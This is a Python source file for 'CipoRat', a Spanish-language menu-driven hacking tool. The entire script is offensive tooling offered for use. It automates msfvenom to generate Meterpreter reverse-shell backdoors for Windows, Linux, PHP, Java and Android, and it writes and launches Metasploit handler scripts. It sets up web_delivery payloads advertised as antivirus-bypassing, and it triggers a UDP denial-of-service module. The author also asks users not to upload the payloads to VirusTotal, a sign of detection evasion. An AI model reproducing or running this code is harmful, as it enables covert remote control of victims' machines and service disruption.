#Coding: UTF-8
#@@Thanks for your help Null@@
import socket, time, sys, os, colorama, dns, dns.resolver

#sys.path.insert(1, 'modulos')
from modulos.dos import *
from colorama import Fore, Back, Style

##Declaraciones de Funciones ##

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

def menu():

    clear()

    print(r"""
        #############################################################
        #                  -=\\`\\                                  #
        #              |\\ ____\\_\\__                              #
        #            -=\\c`) ) ) ) )  /                             #
        #               `~~~~~/ /~~`-`                              #
        #                 -==/ /                                    #
        #                 ╔╦═╦╦════╦╦══╦══╦════╗                    #
        #                 ║║╔╬╬═╦═╦╣╠╦═╣║║╠═╦═╗║                    #
        #                 ║║╚╣║║║║╠╗╔╣╩╣║║╠╝║║║║                    #
        #                 ║╚═╩╣╔╩═╝╚═╩═╩╩╩╩═╩╩╝║                    #
        #                 ╚═══╩╩═══════════════╝                    #
        #                  _  _                                     #
        #                 ( `   )_                                  #
        #                (    )    `)                               #
        #              (_   (_ .  _) _)                             #
        #             _ .                        ( `   )_           #
        #   ███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃         (    )    `)         #
        #  ▂▄▅█████████▅▄▃▂                   (_   (_ .  _) _)      #
        # [███████████████████].                                    #
        #  ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                                       #
        #                                                           #
        #             _ _                                           #
        #           (  _ )_                                         #
        #         (_  _(_ ,)                                        #
        #############################################################

    """)
    print("AVISO: CipoRat en windows está en acceso beta, por lo tanto pueden haber bugs\n")
    print("Bienvenido a mi herramienta de código abierto.\n")
    print("1 - Backdoor con msfvenom")
    print("2 - Backdoor 100% indetectable (Antivirus Bypass) *En desarrollo*")
    print("3 - Información")
    print("4 - Instalar metasploit")
    print("5 - Abrir listener en metasploit")
    print("6 - Actualizar CipoRat")
    print("7 - DNS Resolver")
    print("8 - Ataque DoS (Mediante el protocolo UDP)")
    print("9 - Salir\n")

    opcion= int(input("Selecciona una opción: "))
    if opcion == 1:
        funcion1()
    if opcion == 2:
        funcion2()
    if opcion == 3:
        funcion3()
    if opcion == 4:
        funcion4()
    if opcion == 5:
        funcion5()
    if opcion == 6:
        funcion6()
    if opcion == 7:
        funcion7()
    if opcion == 8:
        funcion8()
    if opcion == 9:
        exit()

    else:
        print("Esa opción no existe, pulse ENTER para continuar")
        input()
        menu()


def funcion1():

    clear()

    print("\n1 - Backdoor-Windows con meterpreter (reverse_tcp) *Recomendado*")
    print("2 - Backdoor-Windows con meterpreter (reverse_https)")
    print("3 - Backdoor-Linux con meterpreter (reverse_tcp)")
    print("4 - Backdoor-Linux con meterpreter (reverse_https)")
    print("5 - Backdoor-VPS con meterpreter (reverse_tcp)")
    print("6 - Backdoor-Java con meterpreter (reverse tcp)")
    print("7 - Backdoor-Android con meterpreter (reverse_tcp)")
    print("8 - Salir al menu principal\n")
    msfvenom = int(input("Selecciona una opcion: "))

    if msfvenom == 1:
        opcion1()
    if msfvenom == 2:
        opcion2()
    if msfvenom == 3:
        opcion3()
    if msfvenom == 4:
        opcion4()
    if msfvenom == 5:
        opcion5()
    if msfvenom == 6:
        opcion6()
    if msfvenom == 7:
        opcion7()
    if msfvenom == 8:
        menu()
    else:
        print("Esa opción no existe, pulse ENTER para continuar")
        input()
        funcion1()


def funcion2():

    clear()

    print("1 - Backdoor Indetectable (Powershell, válido para: Windows)")
    print("2 - Backdoor Indetectable (PHP, válido para: Linux, Vps)")
    print("3 - Backdoor Indetectable (Python, válido para: Windows, Linux, VPS)")
    print("4 - Salir al menú principal\n")
    code = int(input("Selecciona una opción: "))

    if code==1:
        code1()
    if code==2:
        code2()
    if code==3:
        code3()
    if code==4:
        menu()

def funcion3():

    clear()

    print("* Esta herramienta fue creada por CipoteMan\n")
    print("* El principal motivo de esta herramienta es facilitar el uso de metasploit\n")
    print("* Se ruega no subir los archivos a www.virustotal.com\n")
    print("* Si quieres ayudarme con este proyecto este es mi discord: CipoteMan#8457\n")
    print("* Espero que le sirva de utilidad :D\n")
    print("")
    variable = input("Desea volver al menu principal? (s/n): ")
    if variable == "s":
        menu()
    else:
        exit()

def funcion4():

    clear()

    if os.name == "nt":
        print("Nuestro sistema detecta que estás usando Windows.")
        print("Este Framework no está diseñado para windows pero podemos ayudarte a añadirle compatibilidad.")
        print("Para añadirle compatibilidad se necesita descargar los siguientes archivos: ")
        os.system("start https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe")
    else:
        seguro = input("Metasploit es necesario para que funcione este programa, quieres continuar? (s/n): ")
        if seguro == "s" or "S":
            os.system('cls' if os.name == 'nt' else 'clear')
            os.system("sudo apt install curl && curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod +x * && sudo ./msfinstall")
        else:
            menu()

def funcion5():

    clear()

    payload = input("Inserte el payload: ")
    lhost = input("Inserte la ip o -dns (LHOST): ")
    lport = input("Inserte el puerto (LPORT): ")
    f = open(r"C:\metasploit\listener.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/handler\n")
        f.write("set payload {}\n".format(payload))
        f.write("set lhost {}\n".format(lhost))
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Inciando listener...")
    os.system(r"cd C:\metasploit && console -r listener.rc")

def funcion6():

    os.system("python actualizar.py" if os.name == "nt" else "python3 actualizar.py")

def funcion7():
    clear()
    host = input("Escribe el host a resolver: ")
    answerA=(dns.resolver.query(host,'A'.format(host)))
    print(answerA.response)

def funcion8():

    clear()
    dos.udp()
    #Esto está en desarrollo
    #opcion = input("Selecciona una opción: ")
    #print("1 - Ataque por UDP")
    #print("2 - Ataque por TCP")
    #if (opcion == "1"):
    #    dos.udp()
    #elif (opcion == "2"):
    #    dos.tcp()

def opcion1():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    output = input("Que nombre le quieres dar al archivo?: ")
    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
    os.system(r"cd C:\metasploit && msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o C:\Users\%USERNAME%\Desktop\{}.exe".format(lhost, lport, output))
    salir = input("Desea abrir el listener de metasploit? (s/n): ")
    os.system(r"cd C:\metasploit")
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/handler\n")
        f.write("set payload windows/meterpreter/reverse_tcp\n")
        f.write("set lhost 0.0.0.0\n")
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    if salir == "s" or "S":
        os.system(r"cd C:\metasploit && console -r meta.rc")
    else:
        menu()

def opcion2():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    output = input("Que nombre le quieres dar al archivo?: ")
    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
    os.system(r"cd C:\metasploit && msfvenom -p windows/meterpreter/reverse_https lhost={} lport={} -f exe -o C:\Users\%USERNAME%\Desktop\{}.exe".format(lhost, lport, output))
    salir = input("Desea abrir el listener de metasploit? (s/n): ")
    os.system(r"cd C:\metasploit")
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/handler\n")
        f.write("set payload windows/meterpreter/reverse_https\n")
        f.write("set lhost 0.0.0.0\n")
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    if salir == "s" or "S":
        os.system(r"cd C:\metasploit && console -r meta.rc")
    else:
        menu()

def opcion3():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    output = input("Que nombre le quieres dar al archivo?: ")
    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
    os.system(r"cd C:\metasploit && msfvenom -p linux/x64/meterpreter/reverse_tcp lhost={} lport={} -f elf -o C:\Users\%USERNAME%\Desktop\{}.elf".format(lhost, lport, output))
    salir = input("Desea abrir el listener de metasploit? (s/n): ")
    os.system(r"cd C:\metasploit")
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/handler\n")
        f.write("set payload linux/x64/meterpreter/reverse_tcp\n")
        f.write("set lhost 0.0.0.0\n")
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    if salir == "s" or "S":
        os.system(r"cd C:\metasploit && console -r meta.rc")
    else:
        menu()

def opcion4():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    output = input("Que nombre le quieres dar al archivo?: ")
    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
    os.system(r"cd C:\metasploit && msfvenom -p linux/x64/meterpreter/reverse_https lhost={} lport={} -f elf -o C:\Users\%USERNAME%\Desktop\{}.elf".format(lhost, lport, output))
    salir = input("Desea abrir el listener de metasploit? (s/n): ")
    os.system(r"cd C:\metasploit")
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/handler\n")
        f.write("set payload linux/x64/meterpreter/reverse_https\n")
        f.write("set lhost 0.0.0.0\n")
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    if salir == "s" or "S":
        os.system(r"cd C:\metasploit && console -r meta.rc")
    else:
        menu()

def opcion5():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    output = input("Que nombre le quieres dar al archivo?: ")
    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
    os.system(r"cd C:\metasploit && msfvenom -p php/meterpreter/reverse_tcp lhost={} lport={} -f raw -o C:\Users\%USERNAME%\Desktop\{}.raw".format(lhost, lport, output))
    salir = input("Desea abrir el listener de metasploit? (s/n): ")
    os.system(r"cd C:\metasploit")
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/handler\n")
        f.write("set payload php/meterpreter/reverse_tcp\n")
        f.write("set lhost 0.0.0.0\n")
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    if salir == "s" or "S":
        os.system(r"cd C:\metasploit && console -r meta.rc")
    else:
        menu()

def opcion6():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    output = input("Que nombre le quieres dar al archivo?: ")
    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
    os.system(r"cd C:\metasploit && msfvenom -p java/meterpreter/reverse_tcp lhost={} lport={} -f jar -o C:\Users\%USERNAME%\Desktop\{}.raw".format(lhost, lport, output))
    salir = input("Desea abrir el listener de metasploit? (s/n): ")
    os.system(r"cd C:\metasploit")
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/handler\n")
        f.write("set payload java/meterpreter/reverse_tcp\n")
        f.write("set lhost 0.0.0.0\n")
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    if salir == "s" or "S":
        os.system(r"cd C:\metasploit && console -r meta.rc")
    else:
        menu()

def opcion7():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    output = input("Que nombre le quieres dar al archivo?: ")
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Creando exploit...")
    os.system("msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} -o {}.apk".format(lhost, lport, output))
    salir = input("Desea abrir el listener de metasploit? (s/n): ")
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/handler\n")
        f.write("set payload android/meterpreter/reverse_tcp\n")
        f.write("set lhost 0.0.0.0\n")
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    if salir == "s" or "S":
        os.system(r"cd C:\metasploit && console -r meta.rc")
    else:
        menu()

def code1():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    os.system('cls' if os.name == 'nt' else 'clear')
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/script/web_delivery\n")
        f.write("set payload generic/shell_reverse_tcp\n")
        f.write("set target 2\n")
        f.write("set lhost {}\n".format(lhost))
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    print("Generando código...\n")
    time.sleep(5)
    os.system(r"cd C:\metasploit && console -r meta.rc")


def code2():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    os.system('cls' if os.name == 'nt' else 'clear')
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/script/web_delivery\n")
        f.write("set payload generic/shell_reverse_tcp\n")
        f.write("set target 1\n")
        f.write("set lhost {}\n".format(lhost))
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    print("Generando código...\n")
    time.sleep(5)
    os.system(r"cd C:\metasploit && console -r meta.rc")


def code3():

    clear()

    lhost = input("Escribe la dirección ip o dns: ")
    lport = int(input("Escribe el puerto: "))
    os.system('cls' if os.name == 'nt' else 'clear')
    f = open(r"C:\metasploit\meta.rc", "w+")
    for i in range(1):
        f.write("use exploit/multi/script/web_delivery\n")
        f.write("set payload python/meterpreter_reverse_tcp\n")
        f.write("set target 1\n")
        f.write("set lhost {}\n".format(lhost))
        f.write("set lport {}\n".format(lport))
        f.write("exploit")
        f.close()
    print("Generando código...\n")
    time.sleep(5)
    os.system(r"cd C:\metasploit && console -r meta.rc")

if os.name == 'nt':
    menu()
else:
    clear()
    print("AVISO: ESTA SCRIPT ESTÁ HECHA PARA WINDOWS")
    print("SE EJECUTARÁ AUTOMÁTICAMENTE EL 'CIPORAT', HECHO PARA LINUX")
    time.sleep(2.6)
    os.system("python3 ciporat.py")
